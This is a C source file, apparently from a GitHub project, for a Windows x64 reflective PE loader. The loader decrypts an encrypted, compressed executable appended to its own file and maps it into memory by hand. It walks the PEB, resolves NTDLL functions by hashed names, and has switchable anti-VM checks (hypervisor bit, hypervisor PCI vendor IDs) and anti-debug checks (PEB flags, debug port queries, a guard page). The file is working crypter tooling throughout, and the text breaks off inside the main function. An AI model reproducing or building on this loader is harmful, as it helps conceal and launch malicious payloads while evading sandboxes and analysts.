/*====================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 21.07.2026
//     PROJECT  : REFLECTIVE-PE-LOADER
//     PLATFORM : WIN64
/*====================================*/




/* GitHub: https://github.com/vk-candpython/peldr


REQUIREMENTS (
    Сompiler : MinGW-w64 (w64devkit: https://github.com/niXman/mingw-builds-binaries/releases)
    Support  : Windows x64 (PE32+)
)


https://github.com/vk-candpython/peldr/blob/main/loader.h

INTERNAL LOADER DECLARATIONS */
#include "loader.h"




/* Compile-time validation of feature flags */

#define _FLAG_IS_BOOLEAN(flg) _Static_assert(                     \
    ((flg) == FALSE) || ((flg) == TRUE),                          \
    "Build flag: '" #flg "', must be either (FALSE) or (TRUE)"    \
)


_FLAG_IS_BOOLEAN(  USING_ANTI_VM           );
_FLAG_IS_BOOLEAN(  USING_ANTI_DEBUG        );
_FLAG_IS_BOOLEAN(  USING_ERASE_PE_HEADERS  );


#undef _FLAG_IS_BOOLEAN




/* Function pointers resolved from NTDLL exports */

static  NtTerminateProcess_t         pNtTerminateProcess = NULL  ; // Safe _exit if unresolved
static  NtClose_t                    pNtClose                    ;

static  NtAllocateVirtualMemory_t    pNtAllocateVirtualMemory    ;
static  NtProtectVirtualMemory_t     pNtProtectVirtualMemory     ;
static  NtFreeVirtualMemory_t        pNtFreeVirtualMemory        ;

#if (USING_ANTI_VM)
static  NtOpenKey_t                  pNtOpenKey                  ;
static  NtEnumerateKey_t             pNtEnumerateKey             ;
#endif

static  NtOpenFile_t                 pNtOpenFile                 ;
static  NtReadFile_t                 pNtReadFile                 ;
static  NtQueryInformationFile_t     pNtQueryInformationFile     ;

static  NtQueryInformationProcess_t  pNtQueryInformationProcess  ;

static  LdrLoadDll_t                 pLdrLoadDll                 ;
static  LdrGetProcedureAddress_t     pLdrGetProcedureAddress     ;
static  RtlAddFunctionTable_t        pRtlAddFunctionTable        ;




/* Terminate current process with status code,
   Uses only in LOADER-ENTRY-POINT
   (_NtStatusExit & _exit) */
#define NT_EXIT(status) do {     \
    _NtStatusExit = (status);    \
    goto _exit;                  \
} while (0)


/* Universal NT String Initializer
   using compiler type deduction */
#define NT_INIT_STRING(dst, src) do {                        \
    typeof(dst) _d = (dst);                                  \
    typeof(src) _s = (src);                                  \
    typeof(src) _p = _s;                                     \
                                                             \
    WHILE_LIKE (*_p) ++_p;                                   \
    const USHORT _ln = (USHORT)((_p - _s) * sizeof(*_s));    \
                                                             \
    _d->Buffer        = (typeof(_d->Buffer))_s;              \
    _d->Length        = _ln;                                 \
    _d->MaximumLength = _ln + sizeof(*_s);                   \
} while (0)




/* Calculate case-insensitive string hash */
DEC_FUNC(DWORD) HashStr(PCSTR s) {
    DWORD h = HASH_STR_SEED;
    BYTE  c;


    WHILE_LIKE (c = (BYTE)*s++) {
        /* ASCII case-folding */
        c |= ASCII_FOLD_MASK(c);

        /* DJB15 iterative hash step */
        h = ((h << 4) - h) + c;
    }


    return h;
}




/* Get NTDLL base address from PEB module list */
DEC_FUNC(HMODULE) GetNtdllAddr(CONST_PTR(MN_PEB) peb) {
    CONST_PTR(LIST_ENTRY) mdl = &peb->Ldr->InMemoryOrderModuleList;


    FOR_LIKE (const LIST_ENTRY *e = mdl->Flink,  e != mdl,  e = e->Flink) {
        CONST_PTR(MN_LDR_DATA_TABLE_ENTRY) rc =
            CONTAINING_RECORD(e, MN_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        IF_UNLIKE (rc->BaseDllName.Length == NTDLL_NAME_SZ) {
            /* Read first 8 bytes of DLL name as hash/integer */
            const UINT64 nm = *(DEC_UNALIGNED(UINT64)*)rc->BaseDllName.Buffer;

            IF_LIKE ((nm | NTDLL_NAME_FOLD_MASK) == NTDLL_NAME_HASH)
                return (HMODULE)rc->DllBase;
        }
    }


    return NULL;
}




/* Resolve NTDLL exports
   and initialize function table */
DEC_FUNC(BOOLEAN) InitNtdllFunctions(
    HMODULE                         hmd,
    CONST_PTR(IMAGE_DATA_DIRECTORY) exdr,
    RESTR_PTR(NT_PFUNC_ENTRY) const ent,
    const BYTE                      eSz
) {
    const DWORD exBeg = exdr->VirtualAddress,
                exEnd = exBeg + exdr->Size;

    CONST_PTR(IMAGE_EXPORT_DIRECTORY) extb =
        RVA(PIMAGE_EXPORT_DIRECTORY, hmd, exBeg);


    CONST_PTR(DWORD) func = RVA(PDWORD, hmd, extb->AddressOfFunctions   );
    const     DWORD *addr = RVA(PDWORD, hmd, extb->AddressOfNames       );
    const     WORD  *ordd = RVA(PWORD,  hmd, extb->AddressOfNameOrdinals);


    CONST_PTR(DWORD) addrEnd = addr + extb->NumberOfNames;
    BYTE             left    = eSz;

    FOR_LIKE (,  left && (addr < addrEnd),  (addr++, ordd++)) {
        const DWORD hs = HashStr(RVA(PCSTR, hmd, *addr));

        FOR_LIKE (BYTE j = 0,  j < eSz,  j++) {
            IF_UNLIKE (ent[j].Hash == hs) {
                const DWORD frv = func[*ordd];

                /* Forwarded exports are not supported */
                IF_UNLIKE ((frv >= exBeg) && (frv < exEnd))
                    return FALSE;


                /* Store resolved function address */
                *ent[j].Func = RVA(PVOID, hmd, frv);

                --left;
                break;
            }
        }
    }


    /* TRUE if all functions resolved */
    return !left;
}




/* Initialize required NTDLL exports from the PEB */
DEC_FUNC(BOOLEAN) InitNtdllApi(CONST_PTR(MN_PEB) peb) {
    const HMODULE h = GetNtdllAddr(peb);
    IF_UNLIKE (!h) return FALSE;


    CONST_PTR(IMAGE_NT_HEADERS64) hdNt =
        RVA(PIMAGE_NT_HEADERS64, h, DOS_LFANEW(h));

    CONST_PTR(IMAGE_DATA_DIRECTORY) exdr =
        &hdNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];


    NT_PFUNC_ENTRY ent[] = {
{ HASH_NtTerminateProcess        , (PVOID*)&pNtTerminateProcess        },
{ HASH_NtClose                   , (PVOID*)&pNtClose                   },

{ HASH_NtAllocateVirtualMemory   , (PVOID*)&pNtAllocateVirtualMemory   },
{ HASH_NtProtectVirtualMemory    , (PVOID*)&pNtProtectVirtualMemory    },
{ HASH_NtFreeVirtualMemory       , (PVOID*)&pNtFreeVirtualMemory       },

#if (USING_ANTI_VM)
{ HASH_NtOpenKey                 , (PVOID*)&pNtOpenKey                 },
{ HASH_NtEnumerateKey            , (PVOID*)&pNtEnumerateKey            },
#endif

{ HASH_NtOpenFile                , (PVOID*)&pNtOpenFile                },
{ HASH_NtReadFile                , (PVOID*)&pNtReadFile                },
{ HASH_NtQueryInformationFile    , (PVOID*)&pNtQueryInformationFile    },

{ HASH_NtQueryInformationProcess , (PVOID*)&pNtQueryInformationProcess },

{ HASH_LdrLoadDll                , (PVOID*)&pLdrLoadDll                },
{ HASH_LdrGetProcedureAddress    , (PVOID*)&pLdrGetProcedureAddress    },
{ HASH_RtlAddFunctionTable       , (PVOID*)&pRtlAddFunctionTable       },
    };


    return InitNtdllFunctions(h, exdr, ent, sizeof(ent) / sizeof(*ent));
}




/* Load a DLL via LdrLoadDll */
DEC_FUNC(HMODULE) LoadDll(PCWSTR nm) {
    PVOID          h = NULL;
    UNICODE_STRING s;

    NT_INIT_STRING(&s, nm);

    pLdrLoadDll(NULL, NULL, &s, &h);
    return (HMODULE)h;
}


/* Resolve exported procedure address */
DEC_FUNC(FARPROC) GetProcedureAddr(
    const HMODULE hmd,
    PCSTR         nm,
    const ULONG   ord
) {
    PVOID p = NULL;

    IF_LIKE (nm) {
        ANSI_STRING s;
        NT_INIT_STRING(&s, nm);
        pLdrGetProcedureAddress(hmd, &s, 0, &p);
    }
    else {
        pLdrGetProcedureAddress(hmd, NULL, ord, &p);
    }

    return (FARPROC)p;
}




/* Copy PE image data into allocated memory */
DEC_FUNC(VOID) CopyImageData(
    RESTR_PTR(VOID) const         img,
    RESTR_PTR(VOID) const         buf,
    CONST_PTR(IMAGE_NT_HEADERS64) hdNt
) {
    /* Copy PE headers */
    MEMCPY(img, buf, hdNt->OptionalHeader.SizeOfHeaders);


    const IMAGE_SECTION_HEADER *sn =
        IMAGE_FIRST_SECTION(hdNt);

    CONST_PTR(IMAGE_SECTION_HEADER) se =
        sn + hdNt->FileHeader.NumberOfSections;

    /* Copy each section */
    FOR_LIKE (,  sn < se,  sn++) {
        const DWORD vrSz = sn->Misc.VirtualSize,
                    rwSz = sn->SizeOfRawData;

        /* Skip virtual-only sections
           with no data */
        IF_UNLIKE (!vrSz) continue;


        const PVOID     dst = RVA(PVOID, img, sn->VirtualAddress  );
        CONST_PTR(VOID) src = RVA(PVOID, buf, sn->PointerToRawData);
        const DWORD     sz  = min(vrSz, rwSz);


        /* Copy section data to image */
        IF_LIKE (sz) MEMCPY(dst, src, sz);

        /* Zero out the rest of the section */
        IF_UNLIKE (vrSz > rwSz) ZEROS((PBYTE)dst + rwSz, vrSz - rwSz);
    }
}




/* Apply base relocations to the mapped image */
DEC_FUNC(VOID) ApplyImageRelocations(
    const PVOID                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    /* Relocation delta actual
       load address offset from ImageBase */
    const ULONGLONG dlt = (ULONGLONG)img - hdOpt->ImageBase;


    CONST_PTR(IMAGE_DATA_DIRECTORY) ldr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    /* Skip if no base relocation table is present */
    IF_UNLIKE (!ldr->VirtualAddress) return;


    const IMAGE_BASE_RELOCATION *rl =
        RVA(PIMAGE_BASE_RELOCATION, img, ldr->VirtualAddress);

    CONST_PTR(IMAGE_BASE_RELOCATION) rlEnd =
        RVA(PIMAGE_BASE_RELOCATION, rl, ldr->Size);


    /* Process each relocation block */
    WHILE_LIKE (rl < rlEnd) {
        const PBYTE     blkVA = RVA(PBYTE, img, rl->VirtualAddress);
        const WORD     *it    = (PWORD)(rl + 1);
        CONST_PTR(WORD) itEnd = it + RELOC_ENTRY_COUNT(rl);


        /* Apply all fixups in this block */
        FOR_LIKE (,  it < itEnd,  it++)
            IF_LIKE (RELOC_IS_DIR64(*it)) {
                const DWORD ofs = RELOC_BLOCK_OFFSET(*it);
                *(PULONGLONG)(blkVA + ofs) += dlt;
            }


        /* Advance to next relocation block */
        rl = RVA(PIMAGE_BASE_RELOCATION, rl, rl->SizeOfBlock);
    }
}




/* Resolve imports for the mapped image */
DEC_FUNC(BOOLEAN) ProcessImageImports(
    const PVOID                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    CONST_PTR(IMAGE_DATA_DIRECTORY) imdr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    /* No imports to process */
    IF_UNLIKE (!imdr->VirtualAddress) return TRUE;


    const IMAGE_IMPORT_DESCRIPTOR *ids =
        RVA(PIMAGE_IMPORT_DESCRIPTOR, img, imdr->VirtualAddress);


    WCHAR DEC_ALIGN_BUF libName[MAX_NAME_LEN];

    WHILE_LIKE (ids->Name) {
    {//* INITIALIZE LIBRARY NAME (convert CHAR to WCHAR)
        const CHAR *_s = RVA(PCHAR, img, ids->Name);
        PWCHAR      _p = libName;

        WHILE_LIKE (*_s) *_p++ = (WCHAR)*_s++;
        *_p = L'\0';
    }//* INITIALIZE LIBRARY NAME


        const HMODULE hLib = LoadDll((PCWSTR)libName);
        IF_UNLIKE (!hLib) return FALSE;

        const DWORD lAtr = ids->Characteristics;


        IMAGE_THUNK_DATA
            *tnk = RVA(PIMAGE_THUNK_DATA, img, ids->FirstThunk),
            *otk = lAtr? RVA(PIMAGE_THUNK_DATA, img, lAtr) : tnk;


        /* Resolve each import thunk pair */
        WHILE_LIKE (tnk->u1.AddressOfData && otk->u1.AddressOfData)
    {//* while AddressOfData
        FARPROC fAdr = NULL;


        /* Resolve by ordinal */
        IF_UNLIKE (otk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
            const ULONG fOrd = (ULONG)((UINT16)otk->u1.Ordinal);

            fAdr = GetProcedureAddr(hLib, NULL, fOrd);
        }
        /* Resolve by name */
        else {
            CONST_PTR(IMAGE_IMPORT_BY_NAME) fNm =
                RVA(PIMAGE_IMPORT_BY_NAME, img, otk->u1.AddressOfData);

            fAdr = GetProcedureAddr(hLib, (PCSTR)fNm->Name, 0);
        }


        /* Commit resolved address to IAT */
        IF_UNLIKE (!fAdr) return FALSE;
        tnk->u1.Function = (ULONGLONG)fAdr;


        ++tnk; ++otk;
    }//* end of while AddressOfData
        ++ids;
    }


    return TRUE;
}




/* Register exception handlers for the mapped image */
DEC_FUNC(BOOLEAN) InitImageExceptionTable(
    const PVOID                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    CONST_PTR(IMAGE_DATA_DIRECTORY) ldr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];


    IF_LIKE (ldr->VirtualAddress)
        return pRtlAddFunctionTable(
            RVA(PRUNTIME_FUNCTION, img, ldr->VirtualAddress),
            (ULONG)(ldr->Size / sizeof(RUNTIME_FUNCTION)),
            (ULONG64)img
        );

    return TRUE;
}




/* Initialize security cookie from load config */
DEC_FUNC(VOID) InitImageSecurityCookie(
    const PVOID                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    CONST_PTR(IMAGE_DATA_DIRECTORY) lcd =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];

    /* No load config to process */
    IF_UNLIKE (!lcd->VirtualAddress) return;


    CONST_PTR(IMAGE_LOAD_CONFIG_DIRECTORY64) lc =
        RVA(PIMAGE_LOAD_CONFIG_DIRECTORY64, img, lcd->VirtualAddress);

    IF_LIKE (lc->SecurityCookie) {
        PULONGLONG ckAdr = (PULONGLONG)lc->SecurityCookie;
        *ckAdr = (ULONGLONG)img ^ *(volatile const ULONGLONG*)KUSER_INTERRUPT_TIME;
    }
}




/* Set memory protection for image sections */
DEC_FUNC(BOOLEAN) SetImageSectionsPermission(
    const PVOID                   img,
    CONST_PTR(IMAGE_NT_HEADERS64) hdNt
) {
{//* Protect PE headers as read-only
    ULONG  hdOlp;
    PVOID  hdAdr = img;
    SIZE_T hdSz  = (SIZE_T)hdNt->OptionalHeader.SizeOfHeaders;

    IF_NTFAIL (pNtProtectVirtualMemory(NT_CUR_PROCESS,
        &hdAdr, &hdSz, PAGE_READONLY, &hdOlp)
    ) return FALSE;
}//* PE headers



    /* Section permission lookup table */
    const ULONG ProtTab[] = {
        PAGE_NOACCESS,     PAGE_EXECUTE,
        PAGE_READONLY,     PAGE_EXECUTE_READ,
        PAGE_READWRITE,    PAGE_EXECUTE_READWRITE,
        PAGE_READWRITE,    PAGE_EXECUTE_READWRITE
    };


    const IMAGE_SECTION_HEADER *scCur =
        IMAGE_FIRST_SECTION(hdNt);

    CONST_PTR(IMAGE_SECTION_HEADER) scEnd =
        scCur + hdNt->FileHeader.NumberOfSections;


    /* Apply protection to each section */
    FOR_LIKE (,  scCur < scEnd,  scCur++) {
        ULONG  olp;
        SIZE_T vsz = (SIZE_T)scCur->Misc.VirtualSize;
        PVOID  adr = RVA(PVOID, img, scCur->VirtualAddress);

        const BYTE idx = SECTION_PROT_IDX(scCur->Characteristics);

        IF_NTFAIL (pNtProtectVirtualMemory(NT_CUR_PROCESS,
            &adr, &vsz, ProtTab[idx], &olp)
        ) return FALSE;
    }



    /* All permissions applied */
    return TRUE;
}




/* Execute TLS callbacks from PE image */
DEC_FUNC(VOID) ExecuteImageTLS(
    const PVOID                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    CONST_PTR(IMAGE_DATA_DIRECTORY) tdr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

    /* Skip if TLS directory is missing */
    IF_UNLIKE (!tdr->VirtualAddress) return;


    CONST_PTR(IMAGE_TLS_DIRECTORY64) tls =
        RVA(PIMAGE_TLS_DIRECTORY64, img, tdr->VirtualAddress);

    IF_UNLIKE (!tls->AddressOfCallBacks) return;


    PIMAGE_TLS_CALLBACK *fcb =
        (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;

    /* Invoke each callback */
    WHILE_LIKE (*fcb) (*fcb++)(img, DLL_PROCESS_ATTACH, NULL);
}




/* Stateful byte mixing (keyed XOR + rotation + state update) */
#define DEC_BYTE(b, idx, stt, key, msk) ({                  \
    const UINT32 _j   =  (*(idx))++;                        \
    const BYTE   _s   =  *(stt);                            \
                                                            \
    const BYTE   _k1  =  (key)[ _j       & (msk)];          \
    const BYTE   _k2  =  (key)[(_j >> 3) & (msk)];          \
                                                            \
    const BYTE   _y   =  ((_k1 << 1) | (     _k2 >> 7))     \
                      ^  ((BYTE)_j   ^ (BYTE)(_j >> 8));    \
    const BYTE   _m   =  _y ^ (_y >> 4);                    \
                                                            \
    const BYTE   _v   =  ((b) ^ _m) - (_s ^ _k1);           \
    const BYTE   _r   =  _rotr8(_v, 3);                     \
                                                            \
    *(stt)            =  (_r + _k2) ^ (_s >> 1);            \
                                                            \
    /* Return decrypt byte */                               \
    _r;                                                     \
})


/* Decode encrypted RLE-compressed data */
DEC_FUNC(VOID) UnPackData(
    RESTR_PTR(BYTE)             dst, const UINT32 dstSz,
    RESTR_PTR(const BYTE)       src, const UINT32 srcSz,
    RESTR_PTR(const BYTE) const key, const BYTE   msk
) {
    UINT32 idx = 0;
    BYTE   stt = *key;

    CONST_PTR(BYTE) dstEnd = dst + dstSz;
    CONST_PTR(BYTE) srcEnd = src + srcSz;


    BYTE l;

    WHILE_LIKE ((dst < dstEnd) && (src < srcEnd)) {
        const BYTE c = DEC_BYTE(*src++, &idx, &stt, key, msk);

        IF_UNLIKE (c & RLE_FLG_RUN) {
            IF_UNLIKE (src >= srcEnd) return;

            l = c & RLE_MAX_RUN;
            const BYTE v = DEC_BYTE(*src++, &idx, &stt, key, msk);

            WHILE_LIKE (l--) *dst++ = v;
        }
        else {
            IF_UNLIKE (c > (srcEnd - src)) return;

            l = c;

            WHILE_LIKE (l--) *dst++ = DEC_BYTE(*src++, &idx, &stt, key, msk);
        }
    }
}




/* Release and nullify a virtual memory buffer */
DEC_FUNC(VOID) FreeBuf(PVOID *pBuf) {
    SIZE_T zr = 0;
    pNtFreeVirtualMemory(NT_CUR_PROCESS, pBuf, &zr, MEM_RELEASE);

    *pBuf = NULL;
}




/* Extracts the appended payload overlay
   from the current process image file */
DEC_FUNC(const BYTE*) ReadOverLay(VOID) {
    /* Initialize with size marker length
       for the initial read */
    UINT32 tlLn = DAT_LEN_SZ;

    PVOID           dtBuf = NULL;
    HANDLE          hFile = NULL;
    PUNICODE_STRING fPath;

    BYTE DEC_ALIGN_BUF pthBuf[MAX_PATH_LEN + sizeof(UNICODE_STRING)];
    ULONG pthBln;



    /* Retrieve the native NT path
       of the current executable */
    IF_NTFAIL (pNtQueryInformationProcess(
        NT_CUR_PROCESS, ProcessImageFileName,
        pthBuf, sizeof(pthBuf), &pthBln
    )) goto _ret;

    fPath = (PUNICODE_STRING)pthBuf;


    IO_STATUS_BLOCK   io;
    OBJECT_ATTRIBUTES attr = DEC_OBJATTR_CASE_INSENSITIVE(fPath);

    IF_NTFAIL (pNtOpenFile(
        &hFile, FILE_READ_DATA|SYNCHRONIZE,
        &attr, &io, FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE
    )) goto _ret;


    FILE_STANDARD_INFORMATION fsi;

    IF_NTFAIL (pNtQueryInformationFile(
        hFile,
        &io, &fsi, sizeof(fsi),
        FileStandardInformation
    )) goto _ret;

    UINT32 fSz = (UINT32)fsi.EndOfFile.QuadPart;


    /* Calculate file offset
       to the beginning of the encrypted data */
    LARGE_INTEGER offS = {.QuadPart = (LONGLONG)(fSz - tlLn)};

    /* Read overlay data length directly
       into the length variable */
    IF_NTFAIL (pNtReadFile(
        hFile,
        NULL, NULL, NULL,
        &io,  &tlLn,
        tlLn, &offS,
        NULL
    )) goto _ret;


    /* Account for the size marker itself
       and verify bounds */
    tlLn += DAT_LEN_SZ;
    IF_UNLIKE (tlLn > fSz) goto _ret;



    /* Allocate virtual memory buffer
       to hold the complete overlay structure */
    SIZE_T dtBufSz = (SIZE_T)tlLn;

    IF_NTFAIL (pNtAllocateVirtualMemory(
        NT_CUR_PROCESS,
        &dtBuf, 0, &dtBufSz,
        NT_ALLOC_FLG, PAGE_READWRITE
    )) goto _ret;

    /* Store overlay size at buffer start
       for unpacker parsing */
    *(PUINT32)dtBuf = tlLn;



    /* Reset the file offset
       to the beginning of the complete overlay data */
    offS.QuadPart = (LONGLONG)(fSz - tlLn);

    /* Read the remainder of the payload from disk,
       skipping the total length header slot */
    IF_NTFAIL (pNtReadFile(
        hFile,
        NULL, NULL, NULL,
        &io,               (PBYTE)dtBuf + DAT_LEN_SZ,
        tlLn - DAT_LEN_SZ, &offS,
        NULL
    )) FreeBuf(&dtBuf);



_ret:
    IF_LIKE (hFile) pNtClose(hFile);
    return (const BYTE*)dtBuf;
}




/* Anti-VM Engine:
   Returns TRUE if virtual machine is DETECTED */
#if (USING_ANTI_VM)
DEC_FUNC(BOOLEAN) AntiVmStage(const BYTE stage) {
    /* CPUID hypervisor present bit check */
    IF_LIKE (stage == AVM_STAGE_CPUID) {
        INT regs[CPUID_REG_COUNT];

        __cpuid(regs, CPUID_LEAF_FEATURES);

        return _bittest(
            (const LONG*)&regs[CPUID_REG_ECX],
            CPUID_HYPERVISOR_BIT
        );
    }
    /* PCI vendor enumeration via registry */
    else IF_LIKE (stage == AVM_STAGE_PCIVEN) {
        BOOLEAN is_VM = TRUE;


        WCHAR DEC_ALIGN_BUF RawPciPath[PCI_REG_PATH_LEN];
        PCI_INIT_REG_PATH(RawPciPath);

        UNICODE_STRING PciPath = {
            .Length        = (PCI_REG_PATH_LEN - 1) * sizeof(*RawPciPath),
            .MaximumLength =  PCI_REG_PATH_LEN      * sizeof(*RawPciPath),
            .Buffer        = (PWSTR)RawPciPath
        };
        OBJECT_ATTRIBUTES attr = DEC_OBJATTR_CASE_INSENSITIVE(&PciPath);


        HANDLE hPci = NULL;

        /* Assume VM if PCI key cannot be opened */
        IF_NTFAIL (pNtOpenKey(&hPci, KEY_ENUMERATE_SUB_KEYS, &attr))
            goto _ret;


        BYTE DEC_ALIGN_BUF buf[MAX_NAME_LEN + sizeof(KEY_BASIC_INFORMATION)];
        ULONG bln;

        /* Enumerate PCI keys
           and match known VM vendor IDs */
        FOR_LIKE (ULONG idx = 0,  TRUE,  idx++) {
            IF_NTFAIL (pNtEnumerateKey(
                hPci, idx,
                KeyBasicInformation,
                buf, sizeof(buf), &bln
            )) break;


            CONST_PTR(KEY_BASIC_INFORMATION) pKey =
                (PKEY_BASIC_INFORMATION)buf;

            IF_LIKE (pKey->NameLength >= PCI_MIN_ID_SZ) {
                /* Extract vendor ID as UINT64 */
                const UINT64 vendorID = *(PUINT64)(
                    (PBYTE)pKey->Name + PCI_SIG_OFFSET_SZ);

                switch (vendorID) {
                    case PCI_VENID_VBOX      :
                    case PCI_VENID_VMWARE    :

                    case PCI_VENID_QEMU      :
                    case PCI_VENID_QEMU_BRG  :
                    case PCI_VENID_QEMU_VGA  :

                    case PCI_VENID_XEN       :
                    case PCI_VENID_HYPER_V   :
                    case PCI_VENID_PARALLELS :
                    /* VM vendor is detected */
                        goto _ret;
                }
            }
        }


    /* No VM vendor found */
    is_VM = FALSE;


    _ret:
        IF_LIKE (hPci) pNtClose(hPci);
        return is_VM;
    }
    /* Unknown stage interpreted as anomaly */
    return TRUE;
}
#endif




/* Anti-Debug Engine:
   Returns TRUE if debug/anomaly is DETECTED */
#if (USING_ANTI_DEBUG)
DEC_FUNC(BOOLEAN) AntiDebugStage(
    const BYTE        stage,
    CONST_PTR(MN_PEB) peb,
    const PVOID       img
) {
    /* Pre-API Raw Structures Check */
    IF_LIKE (stage == ADB_STAGE_PREAPI) {
        return
            *(volatile const BOOLEAN*)KUSER_KD_DEBUGGER_ENABLED
        ||
            peb->BeingDebugged
        ||
            peb->ProcessParameters->DebugFlags
        ;
    }
    /* Native API Checks */
    else IF_LIKE (stage == ADB_STAGE_NTAPI) {
        /* Assume Debugger if cannot be queried */
        HANDLE dbg = NT_CUR_PROCESS;

        pNtQueryInformationProcess(
            dbg, ProcessDebugPort,
            &dbg, sizeof(dbg), NULL
        );
        IF_UNLIKE (dbg) goto _ret;


        dbg = NT_CUR_PROCESS;

        IF_LIKE (pNtQueryInformationProcess(
            dbg, ProcessDebugObjectHandle,
            &dbg, sizeof(dbg), NULL
        ) == STATUS_PORT_NOT_SET) dbg = NULL;


    _ret:
        return !!dbg; // Debugging if dbg != 0
    }
    /* Memory Protection Trap Setup */
    else IF_LIKE (stage == ADB_STAGE_GUARD) {
        PVOID  gAdr = img;
        SIZE_T gSz  = PAGE_GUARD_SIZE;
        ULONG  gOlp;

        return NT_FAIL(pNtProtectVirtualMemory(
            NT_CUR_PROCESS,
            &gAdr, &gSz,
            PAGE_NOACCESS,
            &gOlp
        ));
    }
    /* Unknown stage interpreted as anomaly */
    return TRUE;
}
#endif




/*
/==================\
 LOADER-ENTRY-POINT
/==================\
*/
NTSTATUS WINAPI Main(VOID) {
    NTSTATUS _NtStatusExit = STATUS_SUCCESS;
    ULONGLONG AddrOfEntryPoint;

{//* MAIN
    PMN_PEB peb = GET_PTR_PEB();


#if (USING_ANTI_DEBUG)
    IF_UNLIKE (AntiDebugStage(ADB_STAGE_PREAPI, peb, NULL))
        NT_EXIT(STATUS_ACCESS_VIOLATION);
#endif

#if (USING_ANTI_VM)
    IF_UNLIKE (AntiVmStage(AVM_STAGE_CPUID))
        NT_EXIT(STATUS_NOT_SUPPORTED);
#endif



    IF_UNLIKE (!InitNtdllApi(peb))
        NT_EXIT(STATUS_DLL_NOT_FOUND);


#if (USING_ANTI_DEBUG)
{//* Verify PEB Integrity
    PROCESS_BASIC_INFORMATION pbi;

    pNtQueryInformationProcess(
        NT_CUR_PROCESS, ProcessBasicInformation,
        &pbi, sizeof(pbi), NULL
    );

    IF_UNLIKE ((PVOID)pbi.PebBaseAddress != (PVOID)peb)
        /* Integrity violation detected */
        NT_EXIT(STATUS_INVALID_PARAMETER);
}//* PEB

    IF_UNLIKE (AntiDebugStage(ADB_STAGE_NTAPI, NULL, NULL))
        NT_EXIT(STATUS_ACCESS_VIOLATION);
#endif

#if (USING_ANTI_VM)
    IF_UNLIKE (AntiVmStage(AVM_STAGE_PCIVEN))
        NT_EXIT(STATUS_NOT_SUPPORTED);
#endif



    /* Overlay layout
        1: total_len : DAT_LEN_SZ
        2: key_size  : DAT_KEY_SZ
        3: key       : PE_KEY
        4: raw_len   : DAT_LEN_SZ
        5: payload   : PE_EXE
    */
    const BYTE *PE_DAT = ReadOverLay();
    IF_UNLIKE (!PE_DAT) NT_EXIT(STATUS_FILE_CORRUPT_ERROR);


    const UINT32 PE_DAT_SZ = *(PUINT32)PE_DAT;
    const BYTE   PE_KEY_SZ = *(PE_DAT + DAT_LEN_SZ);


    const UINT32 RW_EXE_SZ = *(PUINT32)(
        (PE_DAT     + DAT_LEN_SZ) +
        (DAT_KEY_SZ + PE_KEY_SZ )
    );

    const UINT32 DT_EXE_SZ = PE_DAT_SZ - (
        (DAT_LEN_SZ + DAT_KEY_SZ) +
        (PE_KEY_SZ  + DAT_LEN_SZ)
    );

    const UINT32 PE_EXE_SZ = max(DT_EXE_SZ, RW_EXE_SZ);


    const BYTE
        *PE_KEY = (PBYTE)(PE_DAT + (DAT_LEN_SZ + DAT_KEY_SZ)),
        *PE_EXE = (PBYTE)(PE_KEY + (PE_KEY_SZ  + DAT_LEN_SZ));



    PVOID buf = NULL;
{//* ALLOCATE DATA BUFFER
    SIZE_T bsz = (SIZE_T)PE_EXE_SZ;

    IF_NTFAIL (pNtAllocateVirtualMemory(
        NT_CUR_PROCESS,
        &buf, 0, &bsz,
        NT_ALLOC_FLG, PAGE_READWRITE
    )) NT_EXIT(STATUS_MEMORY_NOT_ALLOCATED);


    UnPackData(
        (PBYTE)buf, PE_EXE_SZ,
        PE_EXE,     DT_EXE_SZ,
        PE_KEY,     PE_KEY_SZ - 1 // Key size to mask for power-of-two indexing
    );

    /* Release unpacked file data buffer */
    FreeBuf((PVOID*)&PE_DAT);
}//* ALLOCATE DATA BUFFER



    CONST_PTR(IMAGE_NT_HEADERS64) hdNt =
        RVA(PIMAGE_NT_HEADERS64, buf, DOS_LFANEW(buf));

    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt =
        &hdNt->OptionalHeader;


    const BOOLEAN IS_DLL_IMAGE = PE_IS_DLL(&hdNt->FileHeader);



    PVOID img = NULL;
{//* ALLOCATE IMAGE
    SIZE_T isz = (SIZE_T)(PAGE_GUARD_SIZE + hdOpt->SizeOfImage);

    IF_NTFAIL (pNtAllocateVirtualMemory(
        NT_CUR_PROCESS,
        &img, 0, &isz,
        NT_ALLOC_FLG, PAGE_READWRITE
    )) NT_EXIT(STATUS_MEMORY_NOT_ALLOCATED);
}//* ALLOCATE IMAGE


#if (USING_ANTI_DEBUG)
    IF_UNLIKE (AntiDebugStage(ADB_STAGE_GUARD, NULL, img))
        NT_EXIT(STATUS_ACCESS_VIOLATION);
#endif



    /* Advance past guard page to image base */
    img = RVA(PVOID, img, PAGE_GUARD_SIZE);


    CopyImageData(img, buf, hdNt);
    ApplyImageRelocations(img, hdOpt);

    IF_UNLIKE (!ProcessImageImports(img, hdOpt))
        NT_EXIT(STATUS_INVALID_IMAGE_FORMAT);

    IF_UNLIKE (!InitImageExceptionTable(img, hdOpt))
